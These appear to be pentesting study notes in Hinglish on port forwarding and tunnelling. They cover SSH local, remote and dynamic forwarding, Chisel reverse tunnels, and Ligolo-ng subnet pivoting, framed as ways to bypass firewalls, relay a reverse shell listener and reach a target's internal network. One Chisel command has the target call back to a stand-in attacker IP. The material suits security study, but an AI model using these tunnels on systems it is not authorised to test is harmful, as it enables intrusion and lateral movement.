# 🌐 Port Forwarding & Tunneling

## 1. Concept: Tunneling aur Port Forwarding Kya Hai?

- **Port Forwarding:** Ek specific port ki traffic ko ek machine se dusri machine par bhejna. Maan lo target machine ke port 3306 (MySQL) par access chahiye, par wo sirf localhost se allowed hai. Hum port forward karke usse apni machine par mangwa lete hain.
    
- **Tunneling:** Ek protocol ke andar dusre protocol ko chhupa kar bhejna (e.g., HTTP traffic ko SSH ke andar bhej dena). Ye firewalls bypass karne ke kaam aata hai.
    

---

## 2. SSH Port Forwarding (The Classic Way)

SSH sabse powerful tool hai agar aapke paas valid credentials hain.

### A. Local Port Forwarding (`-L`)

Aap target machine ki kisi service ko apne local computer par access karna chahte ho.

- **Scenario:** Target machine par Database chal raha hai (Port 3306) jo bahar se accessible nahi hai.
    
- **Command:**
    
    Bash
    
    ```
    ssh -L 9000:127.0.0.1:3306 user@target-ip
    ```
    
    _Ab aap apne browser/terminal mein `localhost:9000` connect karoge toh target ka `3306` khulega._
    

### B. Remote Port Forwarding (`-R`)

Aap apni machine ki kisi service (jaise reverse shell listener) ko target machine ke liye available karana chahte ho.

- **Command:**

   ```  
    ssh -R 8080:127.0.0.1:4444 user@target-ip
   ```
### C. Dynamic Port Forwarding (`-D`) - Proxy
Pura network scan karne ke liye SOCKS proxy banana.

```
   ssh -D 1080 user@target-ip
```
*Note: Isse use karne ke liye `proxychains` ka setup karna padta hai.*

---

## 3. Chisel (The Modern Way)

Agar SSH access nahi hai, toh **Chisel** best tool hai. Ye HTTP ke upar tunnel banata hai, isliye firewall aksar ise nahi rok paate.

### Step 1: Server Setup (On Attacker Machine)
```bash
./chisel server -p 8000 --reverse
````

### Step 2: Client Setup (On Target Machine)

Target se attacker ki taraf connection bhejo:

Bash

```
./chisel client <ATTACKER_IP>:8000 R:9001:127.0.0.1:80
```

_Iska matlab: Target ka port 80, attacker ke port 9001 par forward ho jayega._

---

## 4. Ligolo-ng (For Full Network Pivoting)

Jab aapko sirf ek port nahi, balki pura **Internal Network Subnet** scan karna ho.

1. **Attacker machine** par `ligolo-proxy` chalao.
    
2. **Target machine** par `ligolo-agent` chalao.
    
3. Interface banao: `sudo ip link add dev ligolo type tun`.
    
4. Route add karo: `sudo ip route add 10.10.20.0/24 dev ligolo`. _Ab aap apne terminal se seedha internal IPs ko ping/scan kar paoge._


---